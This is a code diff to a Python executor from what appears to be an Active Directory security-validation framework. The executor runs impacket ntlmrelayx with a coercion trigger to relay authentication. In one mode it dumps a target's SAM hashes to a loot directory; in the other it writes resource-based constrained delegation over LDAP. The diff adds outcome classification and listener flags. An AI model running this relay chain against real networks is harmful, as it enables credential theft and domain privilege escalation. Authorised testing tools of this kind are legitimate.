@@ -22,8 +22,9 @@ ntlmrelayx listener + coercion-trigger chain on the ADR-001
   facet's ``mutating:false``.
 
 Terminal: ``replication_dump`` (smb_sam) or ``rbcd_access`` (ldap_rbcd) -- both are
-acceptable for the NTLM-RELAY facet. A timeout with no loot / no RBCD marker is an
-honest ``inconclusive``, never a proof.
+acceptable for the NTLM-RELAY facet. Only ``action_succeeded`` is positive;
+``action_denied`` records a relayed session without a successful action. Failed
+coercion, no session, and partial signals retain distinct incomplete outcomes.
 
 ``verified_recipe = False`` (recipe-known-not-run, #66146 C2): ships honest
 (skipped by ``AutoConfirm`` unless ``include_unverified``), all invocations +
@@ -60,8 +61,17 @@ from .coercion import COERCION_METHODS, coercion_trigger_argv
 
 
 RELAY_MODES = ("smb_sam", "ldap_rbcd")
+# Class-wide verified_recipe does not prove any individual mode.
+MODE_PROVEN = {"smb_sam": False, "ldap_rbcd": False}
 
 # ---- UNVERIFIED output / artifact markers (see module docstring) --------------
+_RE_AUTH_LANDED = re.compile(
+    r"(Authenticating against (?:ldap|smb)://|SMBD-Thread[^\n]*: (?:Received )?Connection from)",
+    re.I)
+# Incomplete progress signals cannot establish a relayed session or a negative.
+_RE_PARTIAL_SIGNAL = re.compile(
+    r"(Authenticating|SMBD-Thread|Dumping SAM|Delegation rights|"
+    r"Traceback|Exception|Address already in use)", re.I)
 # ntlmrelayx wrote RBCD on the LDAP target (the --delegate-access success line).
 _RE_RELAY_RBCD_OK = re.compile(
     r"(Delegation rights (modified|updated)|can now impersonate|"
@@ -226,11 +236,17 @@ class NTLMRelayExecutor(ValidationExecutor):
         # 1) start the ntlmrelayx listener (non-blocking). UNVERIFIED invocation.
         if mode == "ldap_rbcd":
             listener_argv = ["impacket-ntlmrelayx", "-t", f"ldap://{relay_target}",
-                             "--delegate-access", "-smb2support"]
+                             "--delegate-access", "-smb2support",
+                             "--no-http-server", "--no-wcf-server", "--no-raw-server",
+                             "--no-rpc-server", "--no-winrm-server", "--no-mssql-server",
+                             "--no-rdp-server"]
         else:
             lootdir.mkdir(parents=True, exist_ok=True)
             listener_argv = ["impacket-ntlmrelayx", "-t", f"smb://{relay_target}",
-                             "-smb2support", "-l", str(lootdir)]
+                             "-smb2support", "-l", str(lootdir),
+                             "--no-http-server", "--no-wcf-server", "--no-raw-server",
+                             "--no-rpc-server", "--no-winrm-server", "--no-mssql-server",
+                             "--no-rdp-server"]
         try:
             handle = ctx.proc_manager.start(listener_argv, cwd=str(out_dir))
         except OSError as exc:
@@ -259,36 +275,64 @@ class NTLMRelayExecutor(ValidationExecutor):
         finally:
             final_out = ctx.proc_manager.stop(handle)
 
+        output = output + "\n" + final_out  # runtime only; never serialized
+        captured = captured or (bool(_RE_RELAY_RBCD_OK.search(output))
+                                if mode == "ldap_rbcd" else _loot_present(lootdir))
+        if not fired:
+            classification = "coerce_not_fired"
+        elif captured:
+            classification = "action_succeeded"
+        elif _RE_AUTH_LANDED.search(output):
+            classification = "action_denied"
+        elif _RE_PARTIAL_SIGNAL.search(output):
+            classification = "inconclusive"
+        else:
+            classification = "no_auth_landed"
+        if classification != "action_succeeded":
+            errors.append(classification)
+
         if mode == "ldap_rbcd":
-            captured = captured or bool(_RE_RELAY_RBCD_OK.search(final_out))
             return self._finish_ldap_rbcd(ctx, cfg, v, relay_target, captured,
-                                          steps, errors, gate, mutation, record)
+                                          steps, errors, gate, mutation, record,
+                                          classification)
 
         # smb_sam: the SAM loot file is the proof (read-only, no rollback).
-        captured = captured or _loot_present(lootdir)
         record("sam_loot", listener_argv, RunResult(returncode=None), captured,
                note="SAM loot file present" if captured else "no SAM loot captured")
-        if not captured:
-            errors.append("relay_no_loot")
-            return self._artifact(steps, gate, mutation, None, False, errors)
-        terminal_fact = proof.build_terminal_fact(
-            "replication_dump", ok=True,
-            predicate=(f"relayed coerced auth to smb://{relay_target} and dumped its "
-                       "SAM to a loot file (read-only)"),
+        terminal_fact = self._terminal_fact(cfg, relay_target, mode, classification)
+        return self._artifact(steps, gate, mutation, terminal_fact,
+                              classification == "action_succeeded", errors)
+
+    @staticmethod
+    def _terminal_fact(cfg, relay_target, mode, classification):
+        # Only public identifiers and fixed outcome strings enter the proof.
+        predicates = {
+            "coerce_not_fired": "coercion trigger timed out or failed to run",
+            "no_auth_landed": "no relayed session observed within the poll window (inconclusive)",
+            "action_denied": "relayed session observed but the requested action did not succeed",
+            "action_succeeded": "RBCD write observed" if mode == "ldap_rbcd"
+                                else "SAM loot file present (read-only)",
+            "inconclusive": "partial listener signal without a confirmed outcome (inconclusive)",
+        }
+        return proof.build_terminal_fact(
+            "rbcd_access" if mode == "ldap_rbcd" else "replication_dump",
+            ok=classification == "action_succeeded",
+            predicate=predicates[classification],
             proof_token=proof.proof_token("NTLM-RELAY", cfg.domain, relay_target,
-                                          "smb_sam", "sam_loot"),
-            extra={"mode": "smb_sam", "relay_target": _short_name(relay_target)})
-        return self._artifact(steps, gate, mutation, terminal_fact, True, errors)
+                                          mode, classification),
+            extra={"mode": mode, "mode_proven": MODE_PROVEN[mode],
+                   "relay_target": _short_name(relay_target),
+                   "classification": classification})
 
     # ------------------------------------------------- ldap_rbcd finish + rollback
     def _finish_ldap_rbcd(self, ctx, cfg, v, relay_target, captured,
-                          steps, errors, gate, mutation, record) -> dict:
+                          steps, errors, gate, mutation, record, classification) -> dict:
         record("relay_rbcd_write", ["impacket-ntlmrelayx", "--delegate-access"],
                RunResult(returncode=None), captured,
                note="RBCD written via relay" if captured else "no RBCD write captured")
         if not captured:
-            errors.append("relay_no_rbcd")
-            return self._artifact(steps, gate, mutation, None, False, errors)
+            terminal_fact = self._terminal_fact(cfg, relay_target, "ldap_rbcd", classification)
+            return self._artifact(steps, gate, mutation, terminal_fact, False, errors)
 
         # The relay WROTE RBCD on the target -> AD mutated -> verified rollback.
         mutation["applied"] = True
@@ -322,16 +366,10 @@ class NTLMRelayExecutor(ValidationExecutor):
         if not mutation["rollback"]["verified"]:
             errors.append("rollback_unverified")
 
-        terminal_fact = proof.build_terminal_fact(
-            "rbcd_access", ok=True,
-            predicate=(f"relayed coerced auth to ldap://{relay_target} and wrote RBCD "
-                       f"(msDS-AllowedToActOnBehalfOfOtherIdentity) on {vsam}$"),
-            proof_token=proof.proof_token("NTLM-RELAY", cfg.domain, relay_target,
-                                          "ldap_rbcd", "rbcd_write"),
-            extra={"mode": "ldap_rbcd", "relay_target": vsam})
+        terminal_fact = self._terminal_fact(cfg, relay_target, "ldap_rbcd", classification)
         # Complete = relay wrote RBCD AND the rollback was performed (its verification
         # is scored by the rollback guard, not a completeness condition).
-        complete = mutation["rollback"]["performed"]
+        complete = mutation["rollback"]["performed"] and classification == "action_succeeded"
         return self._artifact(steps, gate, mutation, terminal_fact, complete, errors)
 
     @staticmethod
